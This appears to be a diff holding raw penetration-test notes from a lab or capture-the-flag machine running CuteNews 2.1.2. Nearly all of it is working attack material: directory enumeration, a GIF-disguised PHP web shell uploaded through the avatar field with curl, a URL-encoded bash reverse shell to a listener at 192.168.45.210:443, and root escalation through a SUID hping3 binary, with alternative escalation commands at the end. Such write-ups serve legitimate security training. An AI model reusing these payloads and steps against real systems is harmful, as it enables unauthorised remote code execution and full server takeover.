@@ -1,0 +1,158 @@
+┌──(root㉿kali)-[/home/kali]
+└─# gobuster dir -u http://192.168.167.128/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 40 -x php,txt,html   
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.167.128/
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,php,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 280]
+/.hta.php             (Status: 403) [Size: 280]
+/.hta.html            (Status: 403) [Size: 280]
+/.hta.txt             (Status: 403) [Size: 280]
+/.htaccess            (Status: 403) [Size: 280]
+/.htpasswd            (Status: 403) [Size: 280]
+/.htaccess.html       (Status: 403) [Size: 280]
+/.htpasswd.php        (Status: 403) [Size: 280]
+/.htaccess.php        (Status: 403) [Size: 280]
+/.htpasswd.txt        (Status: 403) [Size: 280]
+/.htaccess.txt        (Status: 403) [Size: 280]
+/.htpasswd.html       (Status: 403) [Size: 280]
+/LICENSE.txt          (Status: 200) [Size: 3119]
+/captcha.php          (Status: 200) [Size: 91]
+/core                 (Status: 301) [Size: 317] [--> http://192.168.167.128/core/]
+/docs                 (Status: 301) [Size: 317] [--> http://192.168.167.128/docs/]
+/example.php          (Status: 200) [Size: 9522]
+/favicon.ico          (Status: 200) [Size: 1150]
+/index.html           (Status: 200) [Size: 10701]
+/index.html           (Status: 200) [Size: 10701]
+/index.php            (Status: 200) [Size: 6175]
+/index.php            (Status: 200) [Size: 6175]
+/libs                 (Status: 301) [Size: 317] [--> http://192.168.167.128/libs/]
+/manual               (Status: 301) [Size: 319] [--> http://192.168.167.128/manual/]
+/popup.php            (Status: 200) [Size: 28]
+/print.php            (Status: 200) [Size: 28]
+/rss.php              (Status: 200) [Size: 105]
+/search.php           (Status: 200) [Size: 5310]
+/server-status        (Status: 403) [Size: 280]
+/skins                (Status: 301) [Size: 318] [--> http://192.168.167.128/skins/]
+/uploads              (Status: 301) [Size: 320] [--> http://192.168.167.128/uploads/]
+Progress: 18984 / 18988 (99.98%)
+===============================================================
+Finished
+===============================================================
+
+
+
+CutePHP.com found in license.txt
+
+index.php contains
+CuteNews 2.1.2
+
+┌──(root㉿kali)-[/home/kali]
+└─# searchsploit -m php/remote/46698.rb
+  Exploit: CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)
+      URL: https://www.exploit-db.com/exploits/46698
+     Path: /usr/share/exploitdb/exploits/php/remote/46698.rb
+    Codes: CVE-2019-11447
+ Verified: True
+File Type: Ruby script, Unicode text, UTF-8 text
+Copied to: /home/kali/46698.rb
+
+
+
+
+
+
+register, login
+
+from the source code of
+http://192.168.167.128/index.php?mod=main&opt=personal
+
+name="__signature_key" value="6923514bf9691957980629fd3259ca37-tony" /><input 
+name="__signature_dsi" value="05fcd6caed83099cb496c32b5d0dfd4a" />
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat avatar_tony_tony.php 
+GIF8;
+<?php system($_REQUEST['cmd']); ?>
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# curl -b "CUTENEWS_SESSION=d44e2kip130q3glujnfjakveh2" -F "mod=main" -F "opt=personal" \
+-F "__signature_key=6923514bf9691957980629fd3259ca37-tony" -F "__signature_dsi=05fcd6caed83099cb496c32b5d0dfd4a" \
+-F "editnickname=tony" \
+-F "avatar_file=@avatar_tony_tony.php;type=image/png" \
+"http://192.168.167.128/index.php" 
+<!DOCTYPE html>
+<html lang="en">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+http://192.168.167.128/uploads/avatar_tony_avatar_tony_tony.php?cmd=id
+
+http://192.168.167.128/uploads/avatar_tony_avatar_tony_tony.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.210%2F443%200%3E%261%27%0A
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 443              
+listening on [any] 443 ...
+connect to [192.168.45.210] from (UNKNOWN) [192.168.167.128] 56264
+bash: cannot set terminal process group (773): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@cute:/var/www/html/uploads$ 
+
+www-data@cute:/var/www/html$ sudo -l
+Matching Defaults entries for www-data on cute:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on cute:
+    (root) NOPASSWD: /usr/sbin/hping3 --icmp
+www-data@cute:/var/www/html$ sudo hping3 /bin/sh
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for www-data: 
+Sorry, try again.
+[sudo] password for www-data: 
+Sorry, try again.
+[sudo] password for www-data: 
+sudo: 3 incorrect password attempts
+www-data@cute:/var/www/html$ 
+
+
+www-data@cute:/var/www/html$ cd /usr/sbin
+www-data@cute:/usr/sbin$ hping3
+hping3> id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+hping3> cd /root/
+hping3> ls
+proof.txt  root.txt
+hping3> cat proof.txt
+6507d97ce669037f107249f7ea86a85b
+hping3> 
+
+
+
+could also do
+/bin/sh -p
+
+or
+
+echo 'bash -p' > /tmp/rootme.sh
+chmod +x /tmp/rootme.sh
+sudo /usr/sbin/hping3 --icmp -c 1 -E /tmp/rootme.sh /path/to/writable/root/script
+
